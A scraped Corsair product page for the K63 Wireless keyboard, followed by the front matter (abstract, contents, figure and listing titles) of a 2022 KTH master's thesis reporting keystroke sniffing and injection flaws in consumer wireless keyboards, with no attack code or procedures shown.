=== Content from www.corsair.com_c0b6579d_20250108_133401.html ===
[Skip to Content](#movetomaincontent)![us flag icon](https://assets.corsair.com/image/upload/f_auto,q_auto/akamai/content/images/header/flags/us-flag.svg)[CorsairCorsair](/us/en)

* PRODUCTSPRODUCTS
* GUIDESGUIDES
  ## CORSAIR: EXPLORER

  Browse how-to guides, support articles, and other content related to CORSAIR products.
* BUSINESSBUSINESS
  ## CORSAIR FOR BUSINESS

  Trust the precision engineering and performance innovation that has made Corsair an industry leader for decades. Corsair for Business provides specialized hardware solutions for your industry. Want in?
* SOFTWARESOFTWARE
  ## CORSAIR iCUE SOFTWARE

  Control and synchronize RGB lighting, adjust fan speeds, and monitor CPU and coolant temperatures using CORSAIR’s iCUE software.
* [SUPPORT](https://help.corsair.com/hc/)

Search IconSearchSearch Icon

* User Cartitems in cart
# K63 Wireless Mechanical Gaming Keyboard — Blue LED — CHERRY® MX Red

Experience ultimate gaming freedom with the CORSAIR K63 Wireless Mechanical Gaming Keyboard, featuring ultra-fast 1ms 2.4GHz wireless technology with CHERRY® MX mechanical keyswitches packed into a portable, tenkeyless design.
### Features

##### iCUE Enabled Product

CORSAIR iCUE software brings your entire setup together, creating a fully immersive ecosystem with intuitive control.[LEARN MORE](/us/en/s/icue)

![](data:image/svg+xml;base64...)![](data:image/gif;base64...)![](https://assets.corsair.com/image/upload/f_auto,q_auto/v1665119757/akamai/pdp/icue/icue-logo-bw.png)SKU: CH-9145030-NA

* [Overview](#tab-overview)
* [Tech Specs](#tab-techspecs)
* [Downloads](#tab-downloads)
* [Guides](#tab-support)
* [Package Contents](#tab-packagecontents)

## UNCOMPROMISED WIRELESS, MECHANICAL PERFORMANCE

Experience ultimate gaming freedom with the CORSAIR K63 Wireless Mechanical Gaming Keyboard, featuring ultra-fast 1ms 2.4GHz wireless technology with CHERRY® MX mechanical keyswitches packed into a portable, tenkeyless design.

  ![](https://assets.corsair.com/image/upload/f_auto,q_auto/content/CH-9145030-NA-K63-Wireless-NA-01.png)
## ULTRA-FAST WIRELESS AND WIRED MODES

Connect using ultra-fast 1ms 2.4GHz gaming-optimized wireless technology, low latency Bluetooth® wireless, or wired USB connection.

## 100% CHERRY® MX MECHANICAL KEYSWITCHES

Gold contact CHERRY® MX Red mechanical gaming keyswitches deliver the ultimate performance and competitive advantage.

## LIGHTING CONTROL AND LARGE FONT KEYCAPS

Experience per-key blue backlighting with seven pre-set lighting effects to select from and adjust.

## STRONG WIRELESS ENCRYPTION

128-bit AES wireless encryption helps protect your keystrokes from wireless eavesdropping to keep your personal data safe.

## COMPACT AND PORTABLE

Tenkeyless form factor saves valuable desk space and makes travel easy.

## LONG-LASTING BATTERY

Up to 15 hours of rechargeable battery-powered wireless, or connect via USB wired for uninterrupted gameplay.

## DEDICATED VOLUME AND MULTIMEDIA CONTROLS

Control to adjust audio on-the-fly.

## 100% ANTI-GHOSTING WITH FULL-KEY ROLLOVER

Ensures your commands and simultaneous keystrokes always register the way you intended.

## TAKE CONTROL WITH CUE

Assign macros to any key and customize dynamic lighting effects with CORSAIR Utility Engine (CUE).

## WINDOWS KEY LOCK MODE

Prevent accidental Windows and Context Menu key presses.

## DETACHABLE SOFT-TOUCH WRIST REST

The comfort to enhance your gameplay.

## LIVING ROOM GAMING READY

Combine with the K63 Wireless Gaming Lapboard (sold separately) to create the ultimate go-anywhere desktop experience.

     ![](https://assets.corsair.com/image/upload/f_auto,q_auto/content/iCUE-logo-bw.png)
## Intelligent Control. Unlimited Possibilities.

CORSAIR iCUE software enables vivid dynamic lighting control, sophisticated macro programming and full-system lighting synchronization across compatible CORSAIR peripherals, coolers, fans and more.

[LEARN MORE](/icue)

| Keyboard CUE Software | Supported in iCUE |
| --- | --- |
| Media and Volume Controls | Yes |
| Keyboard Size | Tenkeyless |
| Wrist Rest Included | Yes |
| Keyboard Report Rate | 1,000Hz |
| Keyboard Form Factor | Full Size |
| Keyboard Color | BLACK |
| Switch Type | Mechanical |
| On Board Memory | Yes |
| Keyboard Product Family | K63 Wireless |
| Keyboard Type Size | K63 Wireless |
| Size | Tenkeyless |
| Spill Dust Resistant | Tenkeyless |
| Adjustable Height | Yes |
| Battery Charging | USB to Computer |
| Keyboard Battery Type | Rechargeable Lithium-Ion |
| Keyboard Battery Life | Up to 25 hours at low brightness or 75 hours with backlighting off |
| Headphone Wireless Range | Up to 33ft (10m) |

| Wireless Connectivity | 1ms 2.4GHz wireless, Bluetooth 4.2 |
| --- | --- |
| Wired Connectivity | USB 3.0 or 3.1 Type-A |
| Keyboard Connectivity | Wireless |
| Keyboard Dimensions | 366mm x 173mm x 41mm |
| Keyboard Cable Material | Tangle-free rubber |
| Wrist Rest | Yes |
| WIN Lock | Dedicated Hotkey |
| Media Controls YN | Yes |
| Media Keys | Dedicated Hotkeys |
| Key Rollover | Full Key (NKRO) with 100% Anti-Ghosting |
| Keyboard Matrix | 87 Keys |
| Key Switches | CHERRY MX Red |
| Keyboard Layout | NA |
| Keyboard Backlighting | BLUE |
| Keyboard Warranty | 2 Year |
| Keyboard Compatibility | PC with a USB 3.0 or 3.1 Type-A port|Windows® 10, Windows 8.1, or Windows 7\*|Internet connection for iCUE software download\*\*|\*Windows 10 or 8.1 requi |
| HID Keyboard Report Rate | 1,000Hz |
| Weight | 1.43 |

### Documentation

[K63 Wireless Quick Start Guide](https://assets.corsair.com/image/upload/corsairmedia/sys_master/productcontent/EU_K63_Wireless_QSG_AB.pdf)[K63 Wireless Safety Leaflet](https://assets.corsair.com/image/upload/corsairmedia/sys_master/productcontent/WW_K63_WIRELESS_SafetyLeaflet_AG.pdf)[UKCA Declaration of Conformity (DoC) document - UKCA-000091](https://cwsmgmt.corsair.com/documents/UKCA-000091AB%20K63%20Wireless%20Keyboard%20and%20Dongle.pdf)[Declaration of Conformity (DoC) document - CE-000316](https://cwsmgmt.corsair.com/documents/CE-000316AB%20K63%20Wireless%20Keyboard%20and%20Dongle.pdf)K63 Wireless Mechanical Gaming KeyboardUSB wireless receiverUSB charging / data cableUSB cable adapterDetachable soft touch palm restQuick start ![](https://www.corsair.com/akam/13/pixel_7251879?a=dD1jNDRhNzFhNjFjZmU4NTY2YjUzNDc2NTU3YjIyY2RmNTdiYmRiZGU3JmpzPW9mZg==)

=== Content from kth.diva-portal.org_db4fd7ae_20250108_133359.html ===
Degree Project in Computer Science and Engineering
Second cycle, 30 credits
Penetration testing wireless
keyboards
Are your devices vulnerable?
NIKLAS TOMSIC
Stockholm, Sweden, 2022

Penetration testing wireless
keyboards
Are your devices vulnerable?
NIKLAS TOMSIC
Master’s Programme, Computer Science, 120 credits
Date: August 29, 2022
Supervisors: Roberto Guanciale, Johan von Konow
Examiner: Gerald Quentin Maguire Jr.
School of Electrical Engineering and Computer Science
Host company: Cparta Cyber Defense
Swedish title: Penetrationstest av trådlösa tangentbord
Swedish subtitle: Är dina enheter sårbara?
© 2022 Niklas T omsic
Abstract | i
Abstract
With an ever-increasing amount of cyberespionage and cybercrime, any
potential attack vector into a computer system is worthy of investigation. One
such vector could be through the wireless keyboard the user themselves use
and trust. If an attacker was able to intercept the traﬀic between the keyboard
and the computer they could spy on every keystroke that is being sent to the
computer. Additionally, they could potentially inject keystrokes as if they
were sitting at the computer themselves. This thesis evaluated 10 different
keyboards that were purchased in common consumer electronic stores and 8 of
them were found to have new substantial flaws that made it possible to reliably
listen to every keystroke sent by the keyboards, as well as allow an attacker
to send keystrokes to the connected computer, indirectly giving the attacker
full control of the computer. It was concluded that wireless keyboards should
not be used in situations where sensitive information is handled regardless of
what the keyboard manufacturer claims, as it creates a potential attack vector
that is otherwise nonexistent.
Keywords
Wireless keyboards, penetration testing, radio frequency analysis, Crazyradio,
MouseJack, Enhanced ShockBurst
ii | Abstract
Sammanfattning | iii
Sammanfattning
Med en ständigt ökande mängd cyberspionage och cyberbrottslighet så är
alla potentiella vägar in i ett datorsystem värda att undersöka. Ett sätt att ta
sig in i ett system skulle kunna vara genom det trådlösa tangentbord som
användaren själv använder och litar på. Om en angripare hade möjligheten att
fånga upp trafiken mellan tangentbordet och datorn skulle den kunna lyssna
på varenda knapptryck som skickades till datorn. Utöver det så skulle en
angripare möjligen kunna skicka egna knapptryck till datorn som om den
själv satt vid den. Den här uppsatsen har studerat och utvärderat 10 olika
tangentbord som köptes i vanliga elektronikaffärer och i 8 av dem hittades
nya allvarliga brister som gjorde det möjligt att både avlyssna vad som skrevs
samt att kunna skicka knapptryck till datorn som tangentbordet var kopplat till.
Detta ledde indirekt till full kontroll över datorn. Slutsatsen som kunde dras
var att trådlösa tangentbord inte bör användas i någon situation där känsligt
innehåll hanteras, oavsett vad tillverkaren av tangentbordet hävdar. Detta då
det öppnar upp en ny attackyta som inte finns om trådlösa tangentbord inte
används.
Nyckelord
Trådlösa tangentbord, penetrationstest, radiofrekvensanalys, Crazyradio, Mouse-
Jack, Enhanced ShockBurst
iv | Sammanfattning
Acknowledgments | v
Acknowledgments
I would like to thank my academic examiner Gerald Q. “Chip” Maguire Jr. for
guidance, feedback, and support. Without him this thesis would not have been
possible.
I would also like to thank my industry supervisor Johan von Konow . He
made the project a reality and helped me discuss ideas, and provided all the
tools necessary to complete the work.
Stockholm, August 2022
Niklas T omsic
vi | Acknowledgments
Contents | vii
Contents
1 Introduction 1
1.1 Background . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
1.2 Problem . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
1.3 Purpose . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
1.4 Goals . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
1.5 Research Methodology . . . . . . . . . . . . . . . . . . . . . 3
1.6 Delimitations . . . . . . . . . . . . . . . . . . . . . . . . . . 3
1.7 Structure of the thesis . . . . . . . . . . . . . . . . . . . . . . 4
2 Background 5
2.1 Wireless communication . . . . . . . . . . . . . . . . . . . . 5
2.1.1 2.4 GHz ISM Band . . . . . . . . . . . . . . . . . . . 5
2.1.2 Frequency-shift keying . . . . . . . . . . . . . . . . . 6
2.1.3 Bitrate . . . . . . . . . . . . . . . . . . . . . . . . . . 6
2.1.4 Line code . . . . . . . . . . . . . . . . . . . . . . . . 6
2.1.5 Protocols . . . . . . . . . . . . . . . . . . . . . . . . 7
2.1.6 Checksums . . . . . . . . . . . . . . . . . . . . . . . 8
2.1.7 Software defined radio . . . . . . . . . . . . . . . . . 8
2.2 CVE . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8
2.3 Previous Research . . . . . . . . . . . . . . . . . . . . . . . . 9
2.3.1 Promiscious mode nRF24L01+ . . . . . . . . . . . . 9
2.3.2 Bastille Research . . . . . . . . . . . . . . . . . . . . 9
2.3.3 JackIt . . . . . . . . . . . . . . . . . . . . . . . . . . 9
2.4 Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
2.5 Related W ork . . . . . . . . . . . . . . . . . . . . . . . . . . 10
2.5.1 NATO T empest . . . . . . . . . . . . . . . . . . . . . 10
2.5.2 Air-gap . . . . . . . . . . . . . . . . . . . . . . . . . 10
2.5.3 Far Field Electromagnetic Side-Channel Attack . . . . 11
viii | Contents
3 Method 13
3.1 Research Process . . . . . . . . . . . . . . . . . . . . . . . . 13
3.2 Research Paradigm . . . . . . . . . . . . . . . . . . . . . . . 13
3.3 Penetration test . . . . . . . . . . . . . . . . . . . . . . . . . 14
3.3.1 Pre-engagement . . . . . . . . . . . . . . . . . . . . . 14
3.3.2 Information Gathering . . . . . . . . . . . . . . . . . 14
3.3.3 Threat Modeling . . . . . . . . . . . . . . . . . . . . 14
3.3.4 Vulnerability Analysis . . . . . . . . . . . . . . . . . 15
3.3.5 Exploitation . . . . . . . . . . . . . . . . . . . . . . . 15
3.3.6 Post Exploitation . . . . . . . . . . . . . . . . . . . . 16
3.3.7 Reporting . . . . . . . . . . . . . . . . . . . . . . . . 16
3.4 Hardware and Software to be used . . . . . . . . . . . . . . . 17
3.4.1 Hardware . . . . . . . . . . . . . . . . . . . . . . . . 17
3.4.2 Software . . . . . . . . . . . . . . . . . . . . . . . . 18
3.5 V alidity and Reliability of method . . . . . . . . . . . . . . . 18
4 Penetration test 19
4.1 Keyboard specific pre-engagement, Information gathering,
and vulnerability analysis . . . . . . . . . . . . . . . . . . . . 20
4.1.1 Plexgear Mediatrack Edge X . . . . . . . . . . . . . . 20
4.1.1.1 Pre-engagement and Information gathering . 20
4.1.1.2 Vulnerability Analysis . . . . . . . . . . . . 22
4.1.2 Plexgear KM-Silent . . . . . . . . . . . . . . . . . . . 28
4.1.2.1 Pre-engagement & Information gathering . . 28
4.1.2.2 Vulnerability Analysis . . . . . . . . . . . . 29
4.1.3 Deltaco TB-122 . . . . . . . . . . . . . . . . . . . . . 35
4.1.3.1 Pre-engagement & Information gathering . . 35
4.1.3.2 Vulnerability Analysis . . . . . . . . . . . . 36
4.1.4 Clas Ohlson 38-6600 . . . . . . . . . . . . . . . . . . 41
4.1.4.1 Pre-engagement & Information gathering . . 41
4.1.4.2 Vulnerability Analysis . . . . . . . . . . . . 42
4.1.5 Rapoo E9100M . . . . . . . . . . . . . . . . . . . . . 47
4.1.5.1 Pre-engagement & Information gathering . . 47
4.1.5.2 Vulnerability Analysis . . . . . . . . . . . . 48
4.1.6 Logitech MK270 . . . . . . . . . . . . . . . . . . . . 53
4.1.6.1 Pre-engagement & Information gathering . . 53
4.1.6.2 Vulnerability Analysis . . . . . . . . . . . . 54
4.1.7 Corsair K63 Wireless . . . . . . . . . . . . . . . . . . 58
4.1.7.1 Pre-engagement & Information gathering . . 58
Contents | ix
4.1.7.2 Vulnerability Analysis . . . . . . . . . . . . 60
4.1.8 iiglo MK610 . . . . . . . . . . . . . . . . . . . . . . 64
4.1.8.1 Pre-engagement & Information gathering . . 64
4.1.8.2 Vulnerability Analysis . . . . . . . . . . . . 66
4.1.9 Exibel 38-8940 . . . . . . . . . . . . . . . . . . . . . 69
4.1.9.1 Pre-engagement & Information gathering . . 69
4.1.9.2 Vulnerability Analysis . . . . . . . . . . . . 71
4.1.10 Razer BlackWidow V3 Pro . . . . . . . . . . . . . . . 74
4.1.10.1 Pre-engagement & Information gathering . . 74
4.1.10.2 Vulnerability Analysis . . . . . . . . . . . . 76
4.1.11 Summary . . . . . . . . . . . . . . . . . . . . . . . . 80
4.2 Protocol specific vulnerability analysis, Exploitation, Post
Exploitation and Reporting . . . . . . . . . . . . . . . . . . . 81
4.2.1 Plexgear Protocol . . . . . . . . . . . . . . . . . . . . 81
4.2.1.1 Vulnerability Analysis . . . . . . . . . . . . 82
4.2.1.2 Exploitation . . . . . . . . . . . . . . . . . 88
4.2.1.3 Post Exploitation . . . . . . . . . . . . . . . 89
4.2.1.4 Reporting . . . . . . . . . . . . . . . . . . 89
4.2.2 Rapoo Protocol . . . . . . . . . . . . . . . . . . . . . 89
4.2.2.1 Vulnerability Analysis . . . . . . . . . . . . 90
4.2.2.2 Exploitation . . . . . . . . . . . . . . . . . 93
4.2.2.3 Post Exploitation . . . . . . . . . . . . . . . 95
4.2.2.4 Reporting . . . . . . . . . . . . . . . . . . 95
4.2.3 Logitech Protocol . . . . . . . . . . . . . . . . . . . . 95
4.2.3.1 Vulnerability Analysis . . . . . . . . . . . . 95
4.2.3.2 Exploitation . . . . . . . . . . . . . . . . . 96
4.2.3.3 Post Exploitation . . . . . . . . . . . . . . . 96
4.2.3.4 Reporting . . . . . . . . . . . . . . . . . . 96
4.2.4 Corsair Protocol . . . . . . . . . . . . . . . . . . . . 96
4.2.4.1 Vulnerability Analysis . . . . . . . . . . . . 96
4.2.4.2 Exploitation . . . . . . . . . . . . . . . . . 99
4.2.4.3 Post Exploitation . . . . . . . . . . . . . . . 100
4.2.4.4 Reporting . . . . . . . . . . . . . . . . . . 100
4.2.5 iiglo Protocol . . . . . . . . . . . . . . . . . . . . . . 100
4.2.5.1 Vulnerability Analysis . . . . . . . . . . . . 100
4.2.5.2 Exploitation . . . . . . . . . . . . . . . . . 103
4.2.5.3 Post Exploitation . . . . . . . . . . . . . . . 105
4.2.5.4 Reporting . . . . . . . . . . . . . . . . . . 105
4.2.6 Exibel Protocol . . . . . . . . . . . . . . . . . . . . . 105
x | Contents
4.2.6.1 Vulnerability Analysis . . . . . . . . . . . . 105
4.2.6.2 Exploitation . . . . . . . . . . . . . . . . . 106
4.2.6.3 Post Exploitation . . . . . . . . . . . . . . . 107
4.2.6.4 Reporting . . . . . . . . . . . . . . . . . . 107
4.2.7 Razer Protocol . . . . . . . . . . . . . . . . . . . . . 107
4.2.7.1 Vulnerability Analysis . . . . . . . . . . . . 107
4.2.7.2 Exploitation . . . . . . . . . . . . . . . . . 108
4.2.7.3 Post Exploitation . . . . . . . . . . . . . . . 109
4.2.7.4 Reporting . . . . . . . . . . . . . . . . . . 109
5 Summary of Penetration T esting Results 111
6 Discussion 113
6.1 Analysis of results . . . . . . . . . . . . . . . . . . . . . . . . 113
6.2 Discussion of methodology . . . . . . . . . . . . . . . . . . . 114
6.3 Limitations . . . . . . . . . . . . . . . . . . . . . . . . . . . 115
7 Conclusions and Future work 117
7.1 Conclusions . . . . . . . . . . . . . . . . . . . . . . . . . . . 117
7.2 Future work . . . . . . . . . . . . . . . . . . . . . . . . . . . 118
7.2.1 Other Keyboards . . . . . . . . . . . . . . . . . . . . 118
7.2.2 Hardware analysis . . . . . . . . . . . . . . . . . . . 119
7.2.3 Automatic CRC reversing . . . . . . . . . . . . . . . 119
7.3 Reflections . . . . . . . . . . . . . . . . . . . . . . . . . . . 119
References 121
A Supporting material 125
A.1 Plexgear firmware additions . . . . . . . . . . . . . . . . . . . 125
A.2 Plexgear JackIt plugin . . . . . . . . . . . . . . . . . . . . . . 126
A.3 Rapoo JackIt plugin . . . . . . . . . . . . . . . . . . . . . . . 131
A.4 Corsair JackIt plugin . . . . . . . . . . . . . . . . . . . . . . 132
A.5 iiglo JackIt plugin . . . . . . . . . . . . . . . . . . . . . . . . 137
A.6 Exibel JackIt plugin . . . . . . . . . . . . . . . . . . . . . . . 138
A.7 Corsair lookup table . . . . . . . . . . . . . . . . . . . . . . . 140
List of Figures | xi
List of Figures
2.1 Display of different line codes. At the top is the clock for
the signal followed by non-return to zero, return to zero, and
Manchester encoding. . . . . . . . . . . . . . . . . . . . . . . 7
2.2 Example protocol . . . . . . . . . . . . . . . . . . . . . . . . 8
4.1 Lab setup describing the victim and attacker . . . . . . . . . . 19
4.2 Plexgear Mediatrack Edge X keyboard and box . . . . . . . . 21
4.3 Plexgear Mediatrack Edge X spectrum analysis . . . . . . . . 22
4.4 Recording when one of the keys was pressed on the Plexgear
Mediatrack Edge X . . . . . . . . . . . . . . . . . . . . . . . 23
4.5 Analog view of the data from the Plexgear Mediatrack Edge
X when three keys were pressed . . . . . . . . . . . . . . . . 23
4.6 Analog view of a single key press from the Plexgear
Mediatrack Edge X . . . . . . . . . . . . . . . . . . . . . . . 24
4.7 Demodulated view of a single key press from the Plexgear
Mediatrack Edge X . . . . . . . . . . . . . . . . . . . . . . . 24
4.8 Bitrate calculation from the Plexgear Mediatrack Edge X . . . 25
4.9 Protocol from the Plexgear Mediatrack Edge X. Each row
represents an individual captured transmission and each
column is half a byte (4 bits) of data. The coloring has been
performed manually to assist the reverse engineering process
slightly by separating what appears to be different parts of the
protocol. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
4.10 Protocol from the Plexgear Mediatrack Edge X - a zoomed
version of Figure 4.9 . . . . . . . . . . . . . . . . . . . . . . 27
4.11 Plexgear KM Silent keyboard and box . . . . . . . . . . . . . 28
4.12 Plexgear KM Silent spectrum analysis . . . . . . . . . . . . . 29
4.13 Recording key presses on the Plexgear KM Silent . . . . . . . 30
4.14 Analog view of the data from the Plexgear KM Silent . . . . . 30
xii | List of Figures
4.15 Analog view of a single key press from the Plexgear KM Silent 31
4.16 Demodulated view of a single key press from the Plexgear KM
Silent . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
4.17 Bitrate calculation from the Plexgear KM Silent . . . . . . . . 32
4.18 Protocol from the Plexgear KM Silent . . . . . . . . . . . . . 33
4.19 Protocol from the Plexgear KM Silent - a zoomed version of
Figure 4.18 . . . . . . . . . . . . . . . . . . . . . . . . . . . 34
4.20 Deltaco TB-122 keyboard and box . . . . . . . . . . . . . . . 35
4.21 Deltaco TB-122 spectrum analysis . . . . . . . . . . . . . . . 36
4.22 Recording key presses on the Deltaco TB-122 . . . . . . . . . 37
4.23 Analog view of the data from the Deltaco TB-122 . . . . . . . 37
4.24 Analog view of a single key press from the Deltaco TB-122 . . 38
4.25 Demodulated view of a single key press from the Deltaco TB-
122 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38
4.26 Bitrate calculation from the Deltaco TB-122 . . . . . . . . . . 38
4.27 Protocol from the Deltaco TB-122 . . . . . . . . . . . . . . . 39
4.28 Protocol from the Deltaco TB-122 - a zoomed version of
Figure 4.27 . . . . . . . . . . . . . . . . . . . . . . . . . . . 40
4.29 Clas Ohlson 38-6600 keyboard and box . . . . . . . . . . . . 41
4.30 Clas Ohlson 38-6600 spectrum analysis . . . . . . . . . . . . 42
4.31 Recording key presses on the Clas Ohlson 38-6600 . . . . . . 43
4.32 Analog view of the data from the Clas Ohlson 38-6600 . . . . 43
4.33 Analog view of a single key press from the Clas Ohlson 38-6600 44
4.34 Demodulated view of a single key press from the Clas Ohlson
38-6600 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
4.35 Bitrate calculation from the Clas Ohlson 38-6600 . . . . . . . 44
4.36 Protocol from the Clas Ohlson 38-6600 . . . . . . . . . . . . 45
4.37 Protocol from the Clas Ohlson 38-6600 - a zoomed version of
Figure 4.36 . . . . . . . . . . . . . . . . . . . . . . . . . . . 46
4.38 Rapoo E9100M keyboard and box . . . . . . . . . . . . . . . 47
4.39 Rapoo E9100M spectrum analysis . . . . . . . . . . . . . . . 48
4.40 Recording key presses on the Rapoo E9100M . . . . . . . . . 49
4.41 Analog view of the data from the Rapoo E9100M . . . . . . . 49
4.42 Analog view of a single key press from the Rapoo E9100M . . 50
4.43 Demodulated view of a single key press from the Rapoo E9100M 50
4.44 Bitrate calculation from the Rapoo E9100M . . . . . . . . . . 50
4.45 Protocol from the Rapoo E9100M . . . . . . . . . . . . . . . 51
4.46 Protocol from the Rapoo E9100M - a zoomed version of
Figure 4.45 . . . . . . . . . . . . . . . . . . . . . . . . . . . 52
List of Figures | xiii
4.47 Logitech K270 keyboard and box . . . . . . . . . . . . . . . . 53
4.48 Logitech K270 spectrum analysis . . . . . . . . . . . . . . . . 54
4.49 Recording key presses on the Logitech K270 . . . . . . . . . . 55
4.50 Analog view of the data from the Logitech K270 . . . . . . . 55
4.51 Analog view of a single key press from the Logitech K270 . . 56
4.52 Demodulated view of a single key press from the Logitech K270 56
4.53 Bitrate calculation from the Logitech K270 . . . . . . . . . . 57
4.54 Protocol from the Logitech K270 . . . . . . . . . . . . . . . . 57
4.55 Protocol from the Logitech K270 - a zoomed version of
Figure 4.54 . . . . . . . . . . . . . . . . . . . . . . . . . . . 58
4.56 Corsair K63 Wireless keyboard and box . . . . . . . . . . . . 59
4.57 Corsair K63 Wireless spectrum analysis . . . . . . . . . . . . 60
4.58 Recording key presses on the Corsair K63 Wireless . . . . . . 61
4.59 Analog view of the data from the Corsair K63 Wireless . . . . 61
4.60 Analog view of a single key press from the Corsair K63 Wireless 62
4.61 Demodulated view of a single key press from the Corsair K63
Wireless . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62
4.62 Bitrate calculation from the Corsair K63 Wireless . . . . . . . 62
4.63 Protocol from the Corsair K63 Wireless . . . . . . . . . . . . 63
4.64 Protocol from the Corsair K63 Wireless - a zoomed version of
Figure 4.63 . . . . . . . . . . . . . . . . . . . . . . . . . . . 64
4.65 iiglo MK610 keyboard and box . . . . . . . . . . . . . . . . . 65
4.66 iiglo K610 spectrum analysis . . . . . . . . . . . . . . . . . . 65
4.67 Recording key presses on the iiglo K610 . . . . . . . . . . . . 66
4.68 Analog view of the data from the iiglo K610 . . . . . . . . . . 67
4.69 Analog view of a single key press from the iiglo K610 . . . . . 67
4.70 Demodulated view of a single key press from the iiglo K610 . 67
4.71 Bitrate calculation from the iiglo K610 . . . . . . . . . . . . . 68
4.72 Protocol from the iiglo K610 . . . . . . . . . . . . . . . . . . 68
4.73 Protocol from the iiglo K610 - a zoomed version of Figure 4.72 69
4.74 Exibel 38-8940 keyboard and box . . . . . . . . . . . . . . . 70
4.75 Exibel 38-8940 spectrum analysis . . . . . . . . . . . . . . . 70
4.76 Recording key presses on the Exibel 38-8940 . . . . . . . . . 71
4.77 Analog view of the data from the Exibel 38-8940 . . . . . . . 72
4.78 Analog view of a single key press from the Exibel 38-8940 . . 72
4.79 Demodulated view of a single key press from the Exibel 38-8940 72
4.80 Bitrate calculation from the Exibel 38-8940 . . . . . . . . . . 73
4.81 Protocol from the Exibel 38-8940 . . . . . . . . . . . . . . . 73
xiv | List of Figures
4.82 Protocol from the Exibel 38-8940 - a zoomed version of
Figure 4.81 . . . . . . . . . . . . . . . . . . . . . . . . . . . 74
4.83 Razer BlackWidow V3 Pro keyboard and box . . . . . . . . . 75
4.84 Razer BlackWidow V3 Pro spectrum analysis . . . . . . . . . 76
4.85 Recording key presses on the Razer BlackWidow V3 Pro . . . 77
4.86 Analog view of the data from the Razer BlackWidow V3 Pro . 77
4.87 Analog view of a single key press from the Razer BlackWidow
V3 Pro . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78
4.88 Demodulated view of a single key press from the Razer
BlackWidow V3 Pro . . . . . . . . . . . . . . . . . . . . . . 78
4.89 Bitrate calculation from the Razer BlackWidow V3 Pro . . . . 79
4.90 Protocol from the Razer BlackWidow V3 Pro . . . . . . . . . 79
4.91 Protocol from the Razer BlackWidow V3 Pro - a zoomed
version of Figure 4.90 . . . . . . . . . . . . . . . . . . . . . . 80
4.92 Examples of the same checksum appearing in situations where
the address differs. Y ellow: Presumed address, Green: T ype
and sequence number, Red: Data, Blue: Checksum . . . . . . 83
4.93 Plexgear Protocol . . . . . . . . . . . . . . . . . . . . . . . . 83
4.94 The execution and results of CRC RevEng that give a correct
checksum algorithm for the Plexgear protocol. The first
argument given to the program specifies a cyclic redundancy
check (CRC) of 16 bits, the second that we want to search
for the correct algorithm. The parameters given to the
program starting with “22db”, “21db”, and “26db” are
different transmissions that the keyboard has sent. The last
4 characters of these have also been swapped. This can be
seen by comparing the first of these parameters with the first
transmission in fig. 4.92 . . . . . . . . . . . . . . . . . . . . . 84
4.95 Brute force attempt at recovering a linear sequence of numbers
from the captured sequence numbers. . . . . . . . . . . . . . 85
4.96 The output of the Crazyradio P A in generic promiscuous mode
with the ’ A ’ key held down . . . . . . . . . . . . . . . . . . . 86
4.97 The different keys highlighted in bold and their corresponding
data value when sent from the keyboard . . . . . . . . . . . . 87
4.98 Sniﬀing keystrokes on a Plexgear keyboard with the string
“secret password” typed . . . . . . . . . . . . . . . . . . . . . 88
4.99 A zoomed-in view of some of the bits during the Rapoo
transmission. . . . . . . . . . . . . . . . . . . . . . . . . . . 90
4.100Enhanced Shockburst . . . . . . . . . . . . . . . . . . . . . . 91
List of Figures | xv
4.101Enhanced Shockburst PCF . . . . . . . . . . . . . . . . . . . 91
4.102The output of the Crazyradio P A in generic promiscuous mode
with the ’ A ’ key held down . . . . . . . . . . . . . . . . . . . 92
4.103The output of the Crazyradio P A in generic promiscuous mode
when the ’ A ’ , ’S’, and ’D’ keys are pressed and released . . . . 93
4.104Sniﬀing keystrokes on a Rapoo keyboard with the string
“secret password” typed . . . . . . . . . . . . . . . . . . . . . 94
4.105The data portion of the output of the Crazyradio P A in generic
promiscuous mode when the keys ’ A ’ , ’S’, and ’D’ buttons
were pressed in succession on the Corsair K63 Wireless. . . . 97
4.106Sniﬀing keystrokes on the Corsair K63 Wireless with the
string “secret password” typed . . . . . . . . . . . . . . . . . 99
4.107The iiglo protocol when a special button is pressed. . . . . . . 101
4.108A zoomed-in view of the bits in the iiglo protocol. . . . . . . . 101
4.109iiglo protocol . . . . . . . . . . . . . . . . . . . . . . . . . . 102
4.110The execution and results of CRC RevEng that give a correct
checksum algorithm for the iiglo protocol . . . . . . . . . . . 103
4.111Sniﬀing keystrokes on an iiglo keyboard with the string “secret
password” typed . . . . . . . . . . . . . . . . . . . . . . . . . 104
4.112Sniﬀing keystrokes on an Exibel keyboard with the string
“secret password” typed . . . . . . . . . . . . . . . . . . . . . 106
4.113razer protocol . . . . . . . . . . . . . . . . . . . . . . . . . . 108
xvi | List of Figures
List of T ables | xvii
List of T ables
3.1 Wireless keyboards used for the experiments . . . . . . . . . . 17
4.1 Summary of first stage analysis. All of the keyboards used
frequency shift keying (FSK) as their modulation. . . . . . . . 81
4.2 XOR results of ’ A ’ , ’S’, and ’D’ presses . . . . . . . . . . . . . 98
4.3 Bitmask for ’ A ’ , ’S’, and ’D’ . . . . . . . . . . . . . . . . . . 98
5.1 Summary of the penetration test per protocol . . . . . . . . . . 111
5.2 Summary of penetration test per keyboard . . . . . . . . . . . 112
xviii | List of T ables
Listings | xix
Listings
A.1 Code added to radio.c of the RFStorm nRF24LU1+ Research
Firmware to add support for the Plexgear protocol . . . . . . . 125
A.2 Code to JackIt to enable automatic payload creation for the
Plexgear protocol . . . . . . . . . . . . . . . . . . . . . . . . 126
A.3 Code to JackIt to enable automatic payload creation for the
Rapoo protocol . . . . . . . . . . . . . . . . . . . . . . . . . 131
A.4 Code to JackIt to enable automatic payload creation for the
Corsair protocol . . . . . . . . . . . . . . . . . . . . . . . . . 132
A.5 Code to JackIt to enable automatic payload creation for the
iiglo protocol . . . . . . . . . . . . . . . . . . . . . . . . . . 137
